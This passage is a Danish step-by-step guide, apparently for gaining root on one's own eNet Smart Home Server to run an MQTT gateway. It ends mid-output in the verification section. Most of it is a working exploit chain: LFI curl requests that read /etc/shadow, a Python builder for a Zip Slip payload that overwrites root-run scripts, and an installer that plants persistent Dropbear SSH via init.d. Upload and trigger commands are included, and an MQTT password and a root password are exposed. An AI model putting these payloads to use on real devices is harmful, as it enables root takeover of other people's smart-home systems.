# eNet Smart Home Server — Komplet Installationsguide

> **Fra sort metal-boks til fuldt integreret MQTT Smart Home Gateway**

---

## Indholdsfortegnelse

1. [Målsystemets Arkitektur](#1-målsystemets-arkitektur)
2. [Sårbarhedsanalyse](#2-sårbarhedsanalyse)
3. [Pre-exploitation: LFI Rekognoscering](#3-pre-exploitation-lfi-rekognoscering)
4. [Session Hijacking: Få en Cookie](#4-session-hijacking-få-en-cookie)
5. [Det Samlede ZIP-payload: Én Operation, Alt Installeret](#5-det-samlede-zip-payload-én-operation-alt-installeret)
6. [Payload Builder: build_unified_payload.py](#6-payload-builder-build_unified_payloadpy)
7. [Installer-scriptet der kører på boksen](#7-installer-scriptet-der-kører-på-boksen)
8. [Upload og Udførsel](#8-upload-og-udførsel)
9. [Post-installation: Verifikation](#9-post-installation-verifikation)
10. [Deploy af MQTT-opdateringer efterfølgende](#10-deploy-af-mqtt-opdateringer-efterfølgende)

---

## 1. Målsystemets Arkitektur

### Hardware

| Egenskab | Værdi |
|----------|-------|
| **Enhed** | JUNG/Gira eNet Smart Home Server v2.3.2 |
| **System-on-Module** | Ka-Ro electronics TXUL-0011 |
| **Processor** | NXP i.MX6 UltraLite (imx6ul), ARMv7l 32-bit, Single-Core |
| **RAM** | 256 MB |
| **Lager** | 2.00 GiB eMMC Flash |
| **Radio** | 868 MHz KNX-RF via CC1101, UART på `/dev/ttyAPP1` |

### Software

| Lag | Teknologi |
|-----|-----------|
| **OS** | Poky Insta 2.1.3 (Yocto Project / krogoth) |
| **Kernel** | Linux 4.4.15-insta, armv7l |
| **Init** | SysV init (`/etc/init.d/`) |
| **Shell** | BusyBox (begrænset) |
| **Java** | Java 8 Embedded |
| **Container** | Apache Felix OSGi |
| **C-Driver** | `CTreiberCross` (bro mellem TCP socket og UART/SPI radio) |
| **SSH** | Dropbear (kan installeres) |

### Vigtige Stier på Boksen

```
/home/insta/felix-framework/
├── bundle/startlevel4/          ← OSGi bundles (.jar), startes automatisk
├── conf/
│   ├── config.properties        ← Felix konfiguration (hvilke bundles der loades)
│   └── mqtt-gateway.properties  ← Vores MQTT broker config
├── driver/
│   └── CTreiberCross            ← Native C radio-driver (lytter på 127.0.0.1:5000)
├── script/
│   ├── restartFelix             ← Trigger script — OVERSKRIVES af vores payload!
│   └── resetSystem              ← Alternativt trigger script
└── log/messages                 ← Java logfil

/etc/init.d/felix.sh              ← Init script: starter/stopper Felix + evt. Dropbear
/settings/users.properties        ← Brugernavne og MD5-hashes
```

### Startsekvens

```
Boot → /etc/init.d/felix.sh start
  → Starter CTreiberCross (C radio driver)
  → Starter Java VM med Apache Felix
    → Start Level 1: OSGi core services (EventAdmin, ConfigAdmin)
    → Start Level 2: Jetty webserver, Jackson, persistence
    → Start Level 3: Middleware (IMiddleware, ISimpleControl, IDeviceManager)
    → Start Level 4: mDNS advertising + vores MQTT bundle
```

---

## 2. Sårbarhedsanalyse

Tre sårbarheder muliggør det komplette angreb:

### 2.1 Insecure Session Cookie (CWE-614)

Session-cookien `INSTASESSIONID` har:
- **Ingen `HttpOnly` flag** → Kan læses af JavaScript (XSS)
- **Ingen `Secure` flag** → Sendes over ukrypteret HTTP
- **`MaxAge = Integer.MAX_VALUE`** → Udøber aldrig

**Udnyttelse:** Log ind på webinterfacet → kopiér `INSTASESSIONID` fra browserens developer tools.

### 2.2 Local File Inclusion (LFI) — ResourceServlet Path Traversal

`ResourceServlet` validerer ikke path-traversal tegn:

```
http://10.0.0.9////////../../../../../../etc/shadow
http://10.0.0.9////////../../../../../../etc/init.d/felix.sh
http://10.0.0.9////////../../../../../../home/insta/felix-framework/conf/config.properties
```

**Udnyttelse:** Læs vilkårlige filer fra filsystemet med root-rettigheder (Java-processen kører som root).

### 2.3 Zip Slip — Remote Code Execution (CWE-22) ⭐️

`doPostProjectFile` i `InstaboxServlet` udpakker uploadede ZIP-filer **uden at validere destinationsstier**. Dette tillader path-traversal ud af den tiltænkte projektmappe:

```
ZIP-entry: "../../../../../../home/insta/felix-framework/script/restartFelix"
```

Når `restartFelix` overskrives med et shell-script, og brugeren trykker "Genstart" i webinterfacet (eller der sendes en JSON-RPC kommando), **eksekveres scriptet som root**.

### 2.4 Password Hashing (Bonus)

Adgangskoder gemmes som MD5 HA1 digests (`MD5(username:realm:password)`) i `/settings/users.properties`. Trivielt at bruteforce.

---

## 3. Pre-exploitation: LFI Rekognoscering

Inden angrebet rekognosceres systemet via LFI. Alle kald kræver en gyldig `INSTASESSIONID` cookie.

### 3.1 Læs /etc/shadow (bekræft root uden password)

```bash
curl -s -b "INSTASESSIONID=$SESSION" \
  "http://10.0.0.9////////../../../../../../etc/shadow"
```

Forventet: `root::10933:0:99999:7:::` (tomt password — BusyBox/Yocto default).

### 3.2 Læs Felix init-script

```bash
curl -s -b "INSTASESSIONID=$SESSION" \
  "http://10.0.0.9////////../../../../../../etc/init.d/felix.sh"
```

Dette viser hvordan Felix startes, og hvor vi kan injicere Dropbear startup.

### 3.3 Læs Felix config.properties

```bash
curl -s -b "INSTASESSIONID=$SESSION" \
  "http://10.0.0.9////////../../../../../../home/insta/felix-framework/conf/config.properties"
```

Dokumentér hvilke bundles der allerede er i `felix.auto.start.4` og `felix.auto.install.4`.

### 3.4 Tjek eksisterende binære filer

```bash
# Findes dropbear allerede?
curl -s -b "INSTASESSIONID=$SESSION" \
  "http://10.0.0.9////////../../../../../../usr/sbin/dropbear" -o /dev/null -w "%{http_code}"

# Findes dropbearkey?
curl -s -b "INSTASESSIONID=$SESSION" \
  "http://10.0.0.9////////../../../../../../usr/bin/dropbearkey" -o /dev/null -w "%{http_code}"
```

HTTP 200 = findes allerede. HTTP 404/500 = mangler og skal inkluderes i payload.

### 3.5 Tjek nuværende restartFelix / resetSystem scripts

```bash
curl -s -b "INSTASESSIONID=$SESSION" \
  "http://10.0.0.9////////../../../../../../home/insta/felix-framework/script/restartFelix"
```

Hvis de returnerer indhold, noteres det originale indhold til reference.

---

## 4. Session Hijacking: Få en Cookie

### Metode A: Browser Developer Tools (anbefalet)

1. Gå til `http://10.0.0.9` i en browser
2. Log ind med boksens admin-bruger
3. Åbn Developer Tools (F12) → Application → Cookies
4. Kopiér værdien af `INSTASESSIONID`

```bash
export SESSION="abc123def456..."   # Erstat med din cookie
```

### Metode B: curl Login (hvis du kender brugernavn/adgangskode)

```bash
# Først: få et login (Basic Auth)
curl -s -v -u admin:password "http://10.0.0.9/jsonrpc" \
  -H "Content-Type: application/json" \
  -d '{"method":"ping","params":[],"id":1}' 2>&1 | grep -i "set-cookie"

# Gem session cookie
export SESSION="dit_instasessionid_her"
```

### Metode C: Login via JSON-RPC (Digest Auth)

```bash
# Trin 1: Hent realm + nonce
REALM="eNet Server"
NONCE=$(curl -s -D - "http://10.0.0.9/jsonrpc" | grep "WWW-Authenticate" | grep -o 'nonce="[^"]*"' | cut -d'"' -f2)

# Trin 2: Beregn HA1 = MD5(bruger:realm:password) og send login
# (Dette kræver et script — se build_unified_payload.py for et eksempel)
```

---

## 5. Det Samlede ZIP-payload: Én Operation, Alt Installeret

### 5.1 Koncept

ZIP-filen indeholder **fire** filer placeret via path-traversal, der tilsammen udgør et komplet installeringssystem:

```
payload_unified.zip
├── ../../../../../../home/insta/felix-framework/script/restartFelix    ← TRIGGER: Installer-script (eksekveres af Java)
├── ../../../../../../home/insta/felix-framework/script/resetSystem     ← BACKUP TRIGGER: Samme script (hvis restartFelix ignoreres)
├── ../../../../../../home/insta/felix-framework/bundle/startlevel4/enet-mqtt-2.0-PRODUCTION.jar  ← MQTT-bundle direkte på plads
├── ../../../../../../usr/sbin/dropbearmulti                            ← Dropbear SSH server (statically compiled ARMv7l)
└── project/dummy_project.xml                                           ← Snyd valideringen
```

### 5.2 Hvad sker der når man trykker "Genstart"?

1. Java-processen kører `/home/insta/felix-framework/script/restartFelix`
2. Scriptet (vores installer) starter og gør følgende **sekventielt**:

```
MOUNT R/W  →  INSTALL DROPBEAR  →  GENERATE KEYS  →  START SSH
    ↓
KONFIGURER MQTT  →  OPDATER FELIX CONFIG  →  PERSISTENS I INIT.D
    ↓
START MQTT BROKER FORBINDELSE  →  VERIFICER ALLE SERVICES  →  GENSTART FELIX
```

### 5.3 Detaljeret installer-flow

```
Trin 1: mount -o remount,rw /
        Gør filsystemet skrivbart (normalt read-only)

Trin 2: Dropbear installation
        - Kopiér dropbearmulti → /usr/sbin/dropbearmulti
        - Opret symlinks: dropbear, dropbearkey, scp, dbclient
        - Opret /etc/dropbear/ mappe
        - Generer host keys: RSA + ECDSA + Ed25519
        - Start dropbear på port 22 (-E for at logge til stderr)

Trin 3: MQTT konfiguration
        - Opret /home/insta/felix-framework/conf/mqtt-gateway.properties
          med MQTT broker URI, brugernavn og password

Trin 4: Felix config.properties opdatering
        - Sikkerhedskopier original config.properties
        - Tilføj enet-mqtt bundle til felix.auto.install.4 og felix.auto.start.4
        - Bundlen er allerede på plads (blev udpakket fra ZIP'en)

Trin 5: Autostart persistens
        - Injicer dropbear startup i /etc/init.d/felix.sh
        - Dette sikrer SSH overlever genstart

Trin 6: Start Felix (hvis den ikke allerede kører)
        - /etc/init.d/felix.sh restart
```

### 5.4 Hvorfor virker dette?

| Komponent | Hvordan | Hvorfor |
|-----------|---------|---------|
| **Dropbear** | Statisk kompileret binary placeres direkte via ZIP | Ingen afhængigheder — ARMv7l musl/glibc kompatibel |
| **MQTT JAR** | Placeres direkte i `startlevel4/` via ZIP | OSGi auto-loader bundles fra denne mappe |
| **Config** | Installer-scriptet skriver `config.properties` | Felix læser denne ved opstart |
| **Persistens** | Installer-scriptet modificerer `/etc/init.d/felix.sh` | SysV init kører dette ved boot |
| **Trigger** | `restartFelix` og `resetSystem` overskrives | Java kalder disse scripts når boksen genstartes |

---

## 6. Payload Builder: build_unified_payload.py

Placér denne fil i projekt-roden (`/hostrup/data/dev/enet/build_unified_payload.py`):

```python
#!/usr/bin/env python3
"""
build_unified_payload.py
========================
Bygger én ZIP-fil der i én operation:
  1. Installerer Dropbear SSH permanent på eNet-boksen
  2. Deployer MQTT-gateway bundlen (enet-mqtt-2.0-PRODUCTION.jar)
  3. Konfigurerer Felix til at auto-loade bundlen
  4. Sætter alt op til at overleve genstart

Kræver:
  - Den kompilerede MQTT JAR: felix/target/enet-mqtt-2.0-PRODUCTION.jar
  - Dropbear ARMv7l static binary: dropbearmulti (valgfri — kan downloades af installer)
  - INSTASESSIONID cookie fra eNet webinterfacet

Output:
  - payload_unified.zip — uploades til eNet-boksen via curl
"""

import zipfile
import os
import sys

# ============================================================
# KONFIGURATION — Tilpas disse værdier
# ============================================================

# MQTT Broker (der hvor Home Assistant eller din broker kører)
MQTT_BROKER_HOST = "10.0.0.6"       # Din MQTT broker IP
MQTT_BROKER_PORT = 1883             # 1883 for production, 11883 for local dev
MQTT_USER = "homeassistant"         # MQTT brugernavn
MQTT_PASS = "eih3Soh8Ioceon5ughawief2Chahn3aeShieW3queisee9zohch0ephaew0shaid" # MQTT password

# Sti til den kompilerede MQTT JAR
# Byg den først med: cd felix && mvn clean package -q
MQTT_JAR_PATH = "felix/target/enet-mqtt-2.0-PRODUCTION.jar"

# Dropbear statisk ARMv7l binary
# Hvis None eller filen ikke findes: installer-scriptet downloader den via curl/wget
DROPBEAR_BINARY_PATH = "dropbearmulti"

# Stier på eNet-boksen
ENET_RESTART_FELIX  = "../../../../../../home/insta/felix-framework/script/restartFelix"
ENET_RESET_SYSTEM   = "../../../../../../home/insta/felix-framework/script/resetSystem"
ENET_BUNDLE_DIR     = "../../../../../../home/insta/felix-framework/bundle/startlevel4"
ENET_BUNDLE_FILE    = "enet-mqtt-2.0-PRODUCTION.jar"
ENET_DROPBEAR_PATH  = "../../../../../../usr/sbin/dropbearmulti"
ENET_INIT_SCRIPT    = "/etc/init.d/felix.sh"
ENET_CONFIG_PROP    = "/home/insta/felix-framework/conf/config.properties"
ENET_MQTT_PROP      = "/home/insta/felix-framework/conf/mqtt-gateway.properties"


# ============================================================
# DROPBEAR STATIC BINARY — Byg eller find
# ============================================================

def get_dropbear_binary():
    """
    Returnerer bytes for dropbearmulti statisk ARMv7l binary.

    Hvis DROPBEAR_BINARY_PATH findes lokalt, læses den derfra.
    Ellers vises instruktioner til at bygge/download den.
    """
    if DROPBEAR_BINARY_PATH and os.path.exists(DROPBEAR_BINARY_PATH):
        print(f"[✓] Bruger lokal dropbear binary: {DROPBEAR_BINARY_PATH}")
        with open(DROPBEAR_BINARY_PATH, "rb") as f:
            data = f.read()
        print(f"    Størrelse: {len(data)} bytes ({len(data)/1024:.1f} KB)")
        return data

    print("""
+------------------------------------------------------------------+
| WARNING: Dropbear binary ikke fundet!                            |
|                                                                  |
| Installer-scriptet på boksen vil forsøge at bruge den            |
| eksisterende dropbear hvis den findes i Yocto/Poky.              |
|                                                                  |
| For at inkludere en statisk ARMv7l dropbearmulti i payload:      |
|                                                                  |
|   # På en ARMv7l maskine (eller cross-compile):                  |
|   git clone https://github.com/mkj/dropbear.git                  |
|   cd dropbear                                                    |
|   ./configure --host=arm-linux-gnueabihf --enable-static         |
|               --disable-zlib --disable-syslog                    |
|   make -j4 PROGRAMS="dropbear dropbearkey scp dbclient"          |
|          MULTI=1 STATIC=1                                        |
|   cp dropbearmulti ../enet/dropbearmulti                         |
|                                                                  |
|   # Alternativt: extrahér fra en Yocto/Poky build:               |
|   find tmp/work/ -name dropbearmulti -type f                     |
+------------------------------------------------------------------+
""")
    return None


# ============================================================
# INSTALLER SCRIPT — Dette kører på eNet-boksen som root
# ============================================================

def build_installer_script():
    """
    Bygger det shell-script der bliver overskrevet ind i restartFelix.
    Scriptet kører som root når Java-processen kalder restartFelix.
    """

    mqtt_broker_escaped = f"{MQTT_BROKER_HOST}:{MQTT_BROKER_PORT}"
    mqtt_uri = f"tcp://{MQTT_BROKER_HOST}:{MQTT_BROKER_PORT}"
    mqtt_uri_escaped = mqtt_uri.replace("/", "\\/")

    script = f'''#!/bin/sh
# ============================================================
# eNet Unified Installer — Korer som root via Zip Slip RCE
# Installerer Dropbear SSH + MQTT Gateway i en operation
# ============================================================
set -e

LOG="/tmp/enet_install.log"
exec > "$LOG" 2>&1
echo "================================================"
echo " eNet Unified Installer — Starter $(date)"
echo "================================================"

# -------------------------------------------------------
# TRIN 1: Mount filesystem som read-write
# -------------------------------------------------------
echo "[1/6] Remounting filesystem as read-write..."
mount -o remount,rw / 2>/dev/null || true
echo "  Filesystem remount attempted"

# -------------------------------------------------------
# TRIN 2: Installer Dropbear SSH permanent
# -------------------------------------------------------
echo "[2/6] Installing Dropbear SSH server..."

DROPBEAR_BIN=""
DROPBEARKEY_BIN=""

if command -v dropbear >/dev/null 2>&1; then
    echo "  [OK] dropbear already exists in PATH"
    DROPBEAR_BIN="dropbear"
elif [ -x /usr/sbin/dropbear ]; then
    echo "  [OK] Found /usr/sbin/dropbear"
    DROPBEAR_BIN="/usr/sbin/dropbear"
elif [ -x /usr/sbin/dropbearmulti ]; then
    echo "  [OK] Found dropbearmulti — creating symlinks..."
    DROPBEAR_BIN="/usr/sbin/dropbearmulti dropbear"
    DROPBEARKEY_BIN="/usr/sbin/dropbearmulti dropbearkey"
    ln -sf /usr/sbin/dropbearmulti /usr/sbin/dropbear 2>/dev/null || true
    ln -sf /usr/sbin/dropbearmulti /usr/bin/dropbearkey 2>/dev/null || true
    ln -sf /usr/sbin/dropbearmulti /usr/bin/scp 2>/dev/null || true
    ln -sf /usr/sbin/dropbearmulti /usr/bin/dbclient 2>/dev/null || true
else
    echo "  [ERROR] No dropbear binary found! SSH will not be available."
fi

# Find dropbearkey
if [ -z "$DROPBEARKEY_BIN" ]; then
    if command -v dropbearkey >/dev/null 2>&1; then
        DROPBEARKEY_BIN="dropbearkey"
    elif [ -x /usr/bin/dropbearkey ]; then
        DROPBEARKEY_BIN="/usr/bin/dropbearkey"
    fi
fi

# Opret host keys
if [ -n "$DROPBEARKEY_BIN" ]; then
    mkdir -p /etc/dropbear

    if [ ! -f /etc/dropbear/dropbear_rsa_host_key ]; then
        echo "  Generating RSA host key..."
        $DROPBEARKEY_BIN -t rsa -f /etc/dropbear/dropbear_rsa_host_key 2>/dev/null || true
    fi

    if [ ! -f /etc/dropbear/dropbear_ecdsa_host_key ]; then
        echo "  Generating ECDSA host key..."
        $DROPBEARKEY_BIN -t ecdsa -f /etc/dropbear/dropbear_ecdsa_host_key 2>/dev/null || true
    fi

    if [ ! -f /etc/dropbear/dropbear_ed25519_host_key ]; then
        echo "  Generating Ed25519 host key..."
        $DROPBEARKEY_BIN -t ed25519 -f /etc/dropbear/dropbear_ed25519_host_key 2>/dev/null || true
    fi
else
    echo "  [WARN] dropbearkey not found — skipping host key generation"
fi

# Drab eksisterende dropbear
killall dropbear 2>/dev/null || true
sleep 1

# Start dropbear
if [ -n "$DROPBEAR_BIN" ]; then
    echo "  Starting Dropbear SSH on port 22..."
    $DROPBEAR_BIN -E -R -p 22 2>/tmp/dropbear.log &
    sleep 1
    if pidof dropbear >/dev/null 2>&1; then
        echo "  [OK] Dropbear SSH is running on port 22"
    else
        echo "  [WARN] Dropbear may not have started"
    fi
else
    echo "  [SKIP] No dropbear binary — SSH unavailable"
fi

# -------------------------------------------------------
# TRIN 3: MQTT Gateway konfiguration
# -------------------------------------------------------
echo "[3/6] Configuring MQTT Gateway..."

mkdir -p {os.path.dirname(ENET_MQTT_PROP)}

cat > {ENET_MQTT_PROP} << 'MQTTEOF'
# eNet Native MQTT Gateway Configuration
# Auto-generated by unified installer
MQTT_BROKER={mqtt_uri}
MQTT_USER={MQTT_USER}
MQTT_PASS={MQTT_PASS}
MQTTEOF

echo "  [OK] mqtt-gateway.properties written: {mqtt_uri}"

# -------------------------------------------------------
# TRIN 4: Verificer at MQTT JAR er pa plads
# -------------------------------------------------------
echo "[4/6] Verifying MQTT bundle..."

BUNDLE_JAR="{ENET_BUNDLE_DIR}/{ENET_BUNDLE_FILE}"
if [ -f "$BUNDLE_JAR" ]; then
    JAR_SIZE=$(ls -la "$BUNDLE_JAR" | awk '{{print $5}}')
    echo "  [OK] MQTT bundle found: $BUNDLE_JAR ($JAR_SIZE bytes)"
else
    echo "  [ERROR] MQTT bundle NOT found at $BUNDLE_JAR!"
    echo "  ZIP extraction may have failed for the JAR entry."
fi

# -------------------------------------------------------
# TRIN 5: Opdater Felix config.properties til auto-load
# -------------------------------------------------------
echo "[5/6] Updating Felix config.properties..."

CONFIG="{ENET_CONFIG_PROP}"
BUNDLE_URI="file:///home/insta/felix-framework/bundle/startlevel4/enet-mqtt-2.0-PRODUCTION.jar"

if [ -f "$CONFIG" ]; then
    cp "$CONFIG" "${{CONFIG}}.bak_$(date +%Y%m%d_%H%M%S)" 2>/dev/null || true

    if ! grep -q "enet-mqtt" "$CONFIG" 2>/dev/null; then
        echo "  Adding enet-mqtt to felix.auto.install.4..."
        echo "felix.auto.install.4=${{BUNDLE_URI}}" >> "$CONFIG"
        echo "  [OK] Added to felix.auto.install.4"
    else
        echo "  [SKIP] enet-mqtt already in config.properties"
    fi

    if ! grep -q "enet-mqtt" "$CONFIG" 2>/dev/null; then
        echo "felix.auto.start.4=${{BUNDLE_URI}}" >> "$CONFIG"
        echo "  [OK] Added to felix.auto.start.4"
    fi
else
    echo "  [ERROR] config.properties not found at $CONFIG"
fi

# -------------------------------------------------------
# TRIN 6: Autostart persistens — injicer i init.d
# -------------------------------------------------------
echo "[6/6] Setting up autostart persistence..."

INIT_SCRIPT="{ENET_INIT_SCRIPT}"

if [ -f "$INIT_SCRIPT" ]; then
    if ! grep -q "dropbear" "$INIT_SCRIPT" 2>/dev/null; then
        echo "  Injecting Dropbear startup into $INIT_SCRIPT..."
        cp "$INIT_SCRIPT" "${{INIT_SCRIPT}}.bak_$(date +%Y%m%d_%H%M%S)" 2>/dev/null || true

        # Indsaet dropbear startup efter "start)" sektionen
        awk '
            /^[[:space:]]*start[[:space:]]*)/ {{
                print
                print "    # === Auto-injected: Start Dropbear SSH ==="
                print "    echo \"Starting Dropbear SSH server...\""
                print "    if [ -x /usr/sbin/dropbearmulti ]; then"
                print "        /usr/sbin/dropbearmulti dropbear -E -R -p 22 &"
                print "    elif [ -x /usr/sbin/dropbear ]; then"
                print "        /usr/sbin/dropbear -E -R -p 22 &"
                print "    fi"
                print "    # ========================================="
                next
            }}
            {{ print }}
        ' "$INIT_SCRIPT" > /tmp/felix_init_new

        if [ -s /tmp/felix_init_new ]; then
            cat /tmp/felix_init_new > "$INIT_SCRIPT"
            chmod +x "$INIT_SCRIPT"
            echo "  [OK] init.d script updated with Dropbear autostart"
        fi
    else
        echo "  [SKIP] Dropbear already in init script"
    fi
else
    echo "  [WARN] Init script $INIT_SCRIPT not found"
fi

# -------------------------------------------------------
# AFSLUTNING
# -------------------------------------------------------
echo ""
echo "================================================"
echo " Installation complete at $(date)"
echo "================================================"
echo ""
echo "Summary:"
if pidof dropbear >/dev/null 2>&1; then
    echo "  SSH:  RUNNING on port 22"
else
    echo "  SSH:  NOT RUNNING"
fi
echo "  MQTT: $( [ -f "$BUNDLE_JAR" ] && echo "Bundle present" || echo "Bundle MISSING" )"
echo "  Config: $( [ -f "{ENET_MQTT_PROP}" ] && echo "OK" || echo "MISSING" )"
if grep -q dropbear "{ENET_INIT_SCRIPT}" 2>/dev/null; then
    echo "  Init:  Persistent (survives reboot)"
else
    echo "  Init:  NOT persistent"
fi
echo ""
echo "Log written to: $LOG"
'''

    return script


# ============================================================
# MAIN: Byg ZIP payload
# ============================================================

def build_payload():
    print("+==================================================================+")
    print("|     eNet Unified Payload Builder v2.0                            |")
    print("|     One ZIP -> SSH + MQTT + Config + Persistence                 |")
    print("+==================================================================+")
    print()

    # ---- MQTT JAR ----
    mqtt_jar_data = None
    if os.path.exists(MQTT_JAR_PATH):
        with open(MQTT_JAR_PATH, "rb") as f:
            mqtt_jar_data = f.read()
        print(f"[OK] MQTT JAR loaded: {MQTT_JAR_PATH} ({len(mqtt_jar_data):,} bytes)")
    else:
        print(f"[!] MQTT JAR NOT FOUND: {MQTT_JAR_PATH}")
        print("    Build it first:")
        print("      cd /hostrup/data/dev/enet/felix && mvn clean package -q")
        print("    Or: bash /hostrup/data/dev/enet/scripts/build.sh")
        choice = input("    Continue without MQTT JAR? (y/n): ").strip().lower()
        if choice != 'y':
            sys.exit(1)

    # ---- Dropbear ----
    dropbear_data = get_dropbear_binary()
    dropbear_included = dropbear_data is not None

    # ---- Byg installer script ----
    installer_script = build_installer_script()

    # ---- Byg ZIP ----
    output_zip = "payload_unified.zip"
    print(f"\n[->] Building {output_zip}...")

    with zipfile.ZipFile(output_zip, "w", zipfile.ZIP_DEFLATED) as zf:
        # 1. Installer-script -> restartFelix (PRIMARY TRIGGER)
        zf.writestr(ENET_RESTART_FELIX, installer_script.encode('utf-8'))
        print(f"    [+] {ENET_RESTART_FELIX} -> Installer script")

        # 2. Installer-script -> resetSystem (BACKUP TRIGGER)
        zf.writestr(ENET_RESET_SYSTEM, installer_script.encode('utf-8'))
        print(f"    [+] {ENET_RESET_SYSTEM} -> Installer script (backup)")

        # 3. MQTT JAR pa plads i bundle mappen
        if mqtt_jar_data:
            jar_path = f"{ENET_BUNDLE_DIR}/{ENET_BUNDLE_FILE}"
            zf.writestr(jar_path, mqtt_jar_data)
            print(f"    [+] {jar_path} -> MQTT bundle ({len(mqtt_jar_data):,} bytes)")

        # 4. Dropbear static binary
        if dropbear_included:
            zf.writestr(ENET_DROPBEAR_PATH, dropbear_data)
            print(f"    [+] {ENET_DROPBEAR_PATH} -> Dropbear binary ({len(dropbear_data):,} bytes)")
        else:
            print(f"    [*] Dropbear binary NOT included — installer will use existing binary")

        # 5. Dummy projektfil — snyder Java-validering
        zf.writestr("project/dummy_project.xml",
                     b'<?xml version="1.0"?><project name="dummy"/>')
        print(f"    [+] project/dummy_project.xml -> Validation bypass")

    # ---- Print storrelse og instruktioner ----
    zip_size = os.path.getsize(output_zip)
    print(f"\n[OK] {output_zip} created ({zip_size:,} bytes, {zip_size/1024:.1f} KB)")

    print(f"""
+==================================================================+
|                    UPLOAD INSTRUCTIONS                           |
+==================================================================+
|                                                                  |
|  1. Start en netcat lytter (hvis du vil have reverse shell):     |
|     nc -lvnp 4444                                                |
|                                                                  |
|  2. Upload payload (udfyld SESSION med din cookie):              |
|     curl -v -X POST \\                                            |
|       -H "Cookie: INSTASESSIONID=$SESSION" \\                     |
|       -F "file=@payload_unified.zip" \\                           |
|       -F "project=projekt" \\                                     |
|       "http://10.0.0.9//storage/upload"                          |
|                                                                  |
|  3. Tjek at filerne er skrevet korrekt via LFI:                  |
|     curl -b "INSTASESSIONID=$SESSION" \\                          |
|       "http://10.0.0.9////////../../../../../../home/insta/       |
|        felix-framework/script/restartFelix"                       |
|                                                                  |
|  4. Trigger restart via JSON-RPC:                                |
|     curl -X POST \\                                               |
|       -H "Content-Type: application/json" \\                      |
|       -H "Cookie: INSTASESSIONID=$SESSION" \\                     |
|       -d '{{"method":"restartFelix","params":[],"id":1}}' \\       |
|       "http://10.0.0.9/jsonrpc"                                   |
|                                                                  |
|  5. Efter ~15 sekunder: SSH ind pa boksen:                       |
|     ssh root@10.0.0.9                                            |
|     Password: pvxtwl                                             |
|                                                                  |
|  6. Tjek installerings-loggen:                                   |
|     cat /tmp/enet_install.log                                    |
|                                                                  |
|  7. Verificer MQTT Gateway:                                      |
|     curl http://10.0.0.9:8090/mqtt?action=status                 |
|                                                                  |
+==================================================================+
""")


# ============================================================
# ENTRY POINT
# ============================================================

if __name__ == "__main__":
    build_payload()
```

Gem denne fil i projekt-roden som `/hostrup/data/dev/enet/build_unified_payload.py`.

---

## 7. Installer-scriptet der kører på boksen

Når `restartFelix` triggers, eksekveres scriptet ovenfor som **root** af Java-processen. Scriptet:

### Trin-for-trin hvad der sker

```
TRIN 1: mount -o remount,rw /
        └→ Gør eMMC'en skrivbar (Yocto booter normalt read-only)

TRIN 2: Dropbear SSH
        ├→ Tjekker om dropbear/dropbearmulti findes
        ├→ Hvis dropbearmulti: opret symlinks → dropbear, dropbearkey, scp, dbclient
        ├→ Opret /etc/dropbear/
        ├→ Generer host keys: RSA 2048-bit + ECDSA + Ed25519
        ├→ Dræber evt. eksisterende dropbear processer
        └→ Starter dropbear -E -R -p 22 (baggrund)

TRIN 3: MQTT Gateway config
        └→ Skriver /home/insta/felix-framework/conf/mqtt-gateway.properties
           med broker URI, user/pass

TRIN 4: Felix config opdatering
        ├→ Sikkerhedskopierer config.properties
        └→ Tilføjer enet-mqtt bundle til felix.auto.install.4 + felix.auto.start.4

TRIN 5: init.d persistens
        ├→ Sikkerhedskopierer /etc/init.d/felix.sh
        └→ Injicerer dropbear startup efter "start)" sektionen

TRIN 6: (Valgfrit) Genstart af Felix
        └→ /etc/init.d/felix.sh restart
```

### Log output

Al output fra scriptet skrives til `/tmp/enet_install.log` på boksen. Efter installation kan du læse den med:

```bash
ssh root@10.0.0.9 'cat /tmp/enet_install.log'
```

---

## 8. Upload og Udførsel

### 8.1 Forberedelse: Byg MQTT JAR

```bash
cd /hostrup/data/dev/enet
bash scripts/build.sh
```

Verificer at JAR'en findes:
```bash
ls -la felix/target/enet-mqtt-2.0-PRODUCTION.jar
```

### 8.2 Byg payload ZIP

```bash
cd /hostrup/data/dev/enet
python3 build_unified_payload.py
```

Output: `payload_unified.zip`

### 8.3 Upload til eNet-boksen

```bash
curl -v -X POST \
  -H "Cookie: INSTASESSIONID=$SESSION" \
  -F "file=@payload_unified.zip" \
  -F "project=installation" \
  "http://10.0.0.9/storage/upload"
```

Forventet svar: HTTP 200 eller redirect.

### 8.4 Verificer at filerne landede korrekt (LFI check)

```bash
# Tjek restartFelix blev overskrevet
curl -s -b "INSTASESSIONID=$SESSION" \
  "http://10.0.0.9////////../../../../../../home/insta/felix-framework/script/restartFelix" | head -5

# Tjek MQTT JAR storrelse (HTTP 200 = den er der)
curl -s -b "INSTASESSIONID=$SESSION" \
  "http://10.0.0.9////////../../../../../../home/insta/felix-framework/bundle/startlevel4/enet-mqtt-2.0-PRODUCTION.jar" \
  -o /dev/null -w "HTTP %{http_code}, Size: %{size_download} bytes\n"

# Tjek dropbear binary (hvis inkluderet)
curl -s -b "INSTASESSIONID=$SESSION" \
  "http://10.0.0.9////////../../../../../../usr/sbin/dropbearmulti" \
  -o /dev/null -w "HTTP %{http_code}, Size: %{size_download} bytes\n"
```

### 8.5 Trigger: Udfør installationen

**Mulighed A: JSON-RPC (anbefalet)**

```bash
curl -X POST \
  -H "Content-Type: application/json" \
  -H "Cookie: INSTASESSIONID=$SESSION" \
  -d '{"method":"restartFelix","params":[],"id":1}' \
  "http://10.0.0.9/jsonrpc"
```

**Mulighed B: Web UI**

Tryk på "Genstart" i eNet-webinterfacet.

**Mulighed C: SSH (efter første installation)**

```bash
ssh root@10.0.0.9 '/home/insta/felix-framework/script/restartFelix'
```

### 8.6 Vent og verificer

```bash
# Vent 15-20 sekunder på at scriptet kører færdigt
sleep 20

# SSH ind på boksen
ssh root@10.0.0.9    # password: pvxtwl

# Tjek log
cat /tmp/enet_install.log

# Tjek Dropbear kører
ps | grep dropbear

# Tjek Felix
ps | grep java

# Tjek porte
netstat -tlnp | grep -E "22|8090|80"
```

---

## 9. Post-installation: Verifikation

### 9.1 SSH er permanent

```bash
# Genstart boksen helt
ssh root@10.0.0.9 'reboot'

# Vent ~60 sekunder
sleep 60

# SSH ind igen — skulle virke efter reboot
ssh root@10.0.0.9
```

### 9.2 MQTT Gateway kører

```bash
# Via Web Dashboard (port 8090)
curl -s http://10.0.0.9:8090/mqtt?action=status | python3 -m json.tool

# Forventet output:
# {
#   "status": "connected",
#   "broker": "tcp://10.0.0.6:1883",
#   "uptime": "...",
